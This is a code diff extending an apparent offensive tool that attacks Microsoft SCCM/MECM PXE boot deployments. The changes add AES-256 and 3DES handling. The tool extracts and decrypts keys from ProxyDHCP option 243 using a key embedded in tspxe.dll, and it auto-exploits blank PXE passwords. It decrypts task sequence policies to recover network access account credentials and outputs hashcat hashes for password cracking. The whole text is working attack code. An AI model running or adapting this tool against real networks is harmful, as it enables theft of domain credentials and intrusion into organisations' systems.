@@ -277,6 +277,14 @@ def get_variable_file_path(tftp_server):
             elif packet_type == 2:
                 #Skip first two bytes of option and copy the encrypted data by data_length
                 encrypted_key = variables_file[2:2+data_length]
+                check_mode = str(encrypted_key[13:15].hex())
+                encryption_mode = None
+                if check_mode == "1066":
+                    encryption_mode = "aes256"
+                elif check_mode == "0e66":
+                    encryption_mode = "aes128"
+                elif check_mode == "0366":
+                    encryption_mode = "3des"
                 #Get the index of data_length of the variables file name string in the option, and index of where the string begins
                 string_length_index = 2 + data_length + 1
                 beginning_of_string_index = 2 + data_length + 2
@@ -304,7 +312,7 @@ def get_variable_file_path(tftp_server):
         BLANK_PASSWORDS_FOUND = True
 
         print("[!] Blank password on PXE boot found!")
-        return [variables_file,bcd_file,encrypted_key]
+        return [variables_file,bcd_file,encryption_mode,encrypted_key]
     else:
         return [variables_file,bcd_file]
 
@@ -323,7 +331,8 @@ def get_pxe_files(ip):
     variables_file = answer_array[0]
     bcd_file = answer_array[1]
     if BLANK_PASSWORDS_FOUND:
-        encrypted_key = answer_array[2]
+        encryption_mode = answer_array[2]
+        encrypted_key = answer_array[3]
 
     tftp_download_string = ""
 
@@ -364,7 +373,7 @@ def get_pxe_files(ip):
             auto_exploit_blank_password = general_config.getint("auto_exploit_blank_password")
             if auto_exploit_blank_password:
                 print("[!] Attempting automatic exploitation.")
-                use_encrypted_key(encrypted_key,var_file_name)
+                use_encrypted_key(encrypted_key,var_file_name,encryption_mode)
             else:
                 print("[!] Change auto_exploit_blank_password in settings.ini to 1 to attempt exploitation of blank password")
     else:
@@ -428,14 +437,28 @@ def CryptDecryptMessage(pfx, data):
         print(f"{enc_algo} not implemented yet")
     return decrypted_data
 
+def credential_string_algo(credential_string):
+    algo_bytes = credential_string[112:116]
+    if algo_bytes == "1066":
+        return "aes256"
+    elif algo_bytes == "0366":
+        return "3des"
+    return "3des"
+
 def deobfuscate_credential_string(credential_string):
-    #print(credential_string)
+    algo = credential_string_algo(credential_string)
     key_data = binascii.unhexlify(credential_string[8:88])
     encrypted_data = binascii.unhexlify(credential_string[128:])
-
     key = media_crypto.aes_des_key_derivation(key_data)
-    last_16 = math.floor(len(encrypted_data)/8)*8
-    return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])
+
+    if algo == "aes256":
+        print("[!] Decrypting using AES256")
+        last_16 = math.floor(len(encrypted_data)/16)*16
+        return media_crypto.aes256_decrypt(encrypted_data[:last_16], key[:32])
+    else:
+        print("[!] Decrypting using 3DES")
+        last_16 = math.floor(len(encrypted_data)/8)*8
+        return media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
 
 def decrypt_media_file(path, password):
 
@@ -449,15 +472,24 @@ def decrypt_media_file(path, password):
         print("[+] Password bytes provided: 0x" + password.hex())
 
     # Decrypt encryted media variables file
-    encrypted_file = media_crypto.read_media_variable_file(path)
-    print("[+] Encrypted media file size: %d bytes (using first %d bytes for decryption)" % (len(encrypted_file), math.floor(len(encrypted_file)/16)*16))
+    encrypted_file = media_crypto.read_media_variable_file(path) 
     try:
         if password_is_string:
             key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
         else:
             key = media_crypto.aes_des_key_derivation(password)
         last_16 = math.floor(len(encrypted_file)/16)*16
-        decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
+        decrypted_media_file = ""
+        algo_header = media_crypto.read_media_variable_file_header(path)
+        if "3des" in algo_header[0:4]:
+            print("[+] File header indicates 3DES encryption")
+            decrypted_media_file = media_crypto._3des_decrypt(encrypted_file[:last_16],key[:24])
+        elif "aes128" in algo_header[0:6]:
+            print("[+] File header indicates AES-128 encryption")
+            decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
+        elif "aes256" in algo_header[0:6]:
+            print("[+] File header indicates AES-256 encryption")
+            decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16],key[:32])
         decrypted_media_file =  decrypted_media_file[:decrypted_media_file.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
         print("[+] Successfully decrypted media variables file with the provided password!")
@@ -501,7 +533,13 @@ def process_full_media(password, policy):
         print("[+] Password provided for policy decryption: " + password)
         key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
         last_16 = math.floor(len(encrypted_policy)/16)*16
-        decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16],key[:16])
+        algo_header = media_crypto.read_media_variable_file_header(policy)
+        if "aes256" in algo_header[0:6]:
+            decrypted_ts = media_crypto.aes256_decrypt(encrypted_policy[:last_16],key[:32])
+        elif "3des" in algo_header[0:4]:
+            decrypted_ts = media_crypto._3des_decrypt(encrypted_policy[:last_16],key[:24])
+        else:
+            decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16],key[:16])
         decrypted_ts =  decrypted_ts[:decrypted_ts.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
         print("[+] Successfully Decrypted Policy \"" + policy +"\"!")
@@ -513,28 +551,29 @@ def process_full_media(password, policy):
     process_task_sequence_xml(wf_decrypted_ts)
     process_naa_xml(wf_decrypted_ts)
 
-def use_encrypted_key(encrypted_key, media_file_path):
+def use_encrypted_key(encrypted_key=None, media_file_path=None, encryption_mode=None, encrypted_bytes=None):
 
-    #ProxyDHCP Option 243
-    print("[+] Encrypted key from DHCP option 243 (%d bytes): 0x%s" % (len(encrypted_key), encrypted_key.hex()))
-
-    length = encrypted_key[0]
-    encrypted_bytes = encrypted_key[1:1+length] # pull out bytes that relate to the encrypted bytes in the DHCP response
-    print("[+] Inner encrypted payload (%d bytes, length field=%d): 0x%s" % (len(encrypted_bytes), length, encrypted_bytes.hex()))
-
-    encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
-    print("[+] Isolated encrypted data after trimming [20:-12] (%d bytes): 0x%s" % (len(encrypted_bytes), encrypted_bytes.hex()))
-
-    if len(encrypted_bytes) < 16:
-        print("[-] Encrypted data is only %d bytes, expected at least 16. The DHCP option 243 structure may differ from the expected format." % len(encrypted_bytes))
-        print("[-] Try manually inspecting the DHCP response in Wireshark to determine the correct offsets.")
-        sys.exit(-1)
+    if encrypted_bytes == None:
+        #ProxyDHCP Option 243
+        length = encrypted_key[0]
+        encrypted_bytes = encrypted_key[1:1+length] # pull out bytes that relate to the encrypted bytes in the DHCP response
+        encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
 
     key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
 
     key = media_crypto.aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
 
-    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
+    if encryption_mode == None:
+        try:
+            var_file_key = (media_crypto.aes256_decrypt_raw(encrypted_bytes[:32],key[:32])[:10])
+        except Exception as e:
+            var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10])
+    elif encryption_mode == "aes256":
+        var_file_key = (media_crypto.aes256_decrypt_raw(encrypted_bytes[:32],key[:32])[:10])
+    elif encryption_mode == "3des":
+        var_file_key = (media_crypto._3des_decrypt_raw(encrypted_bytes[:24],key[:24])[:10])
+    else:
+        var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) # 10 byte output
     print("[+] Decrypted var file key (10 bytes): 0x%s" % var_file_key.hex())
     
     #Perform bit extension
@@ -1043,7 +1082,7 @@ if __name__ == "__main__":
             #print(decrypt_media_file(path,password))
             process_full_media(password,policy_file)
     elif int(sys.argv[1]) == 5:
-        print("Hashcat hash: " + "$sccm$aes128$" + media_crypto.read_media_variable_file_header(sys.argv[2]).hex())
+        print("Hashcat hash: " + "$sccm$" + media_crypto.read_media_variable_file_header(sys.argv[2]))
 
     elif int(sys.argv[1]) == 6:
         print("[+] Using MECM PXE Certificate registry key values to retrieve task sequences")
